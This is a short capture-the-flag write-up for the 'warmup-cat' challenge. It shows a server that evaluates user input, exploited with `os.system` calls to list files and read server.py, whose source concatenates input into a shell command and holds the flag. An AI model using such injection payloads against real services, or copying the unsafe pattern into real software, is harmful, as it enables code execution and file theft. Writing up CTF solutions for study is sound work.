# warmup-cat (50pts, 99 solved) Misc [Easy]

## First look
When we connect to the given ip and port and enter some random input, we get the following output:
```
Exec: foo
foo
Traceback (most recent call last):
  File "server.py", line 2, in <module>
    Niswanob1=input('Exec: ')
  File "<string>", line 1, in <module>
NameError: name 'foo' is not defined
```

## Solving
The application looks like it's just `eval`uating what we put in. So we can just find the flag -> `os.system("ls -la")` ->
```
total 28
drwxr-xr-x 1 root root 4096 Nov 10 11:28 .
drwxr-xr-x 1 root root 4096 Oct 12 11:19 ..
-rw-r--r-- 1 ctf  ctf   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ctf  ctf  3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 ctf  ctf   655 Jul 12  2019 .profile
-rwxrwxr-x 1 root root   16 Nov 10 11:28 run.sh
-rwxr-xr-x 1 root root  141 Nov 10 11:28 server.py
```
`os.system("cat server.py")` -> 
```
import os
Niswanob1=input('Exec: ')
os.system(('\\cat ' + Niswanob1))
# ctf{c7592e4a8e0b395cb2c0b661c567a8c9eb2bcbeea9c79c08b722914d2b5e3a55}
```

Where we find our flag: `ctf{c7592e4a8e0b395cb2c0b661c567a8c9eb2bcbeea9c79c08b722914d2b5e3a55}`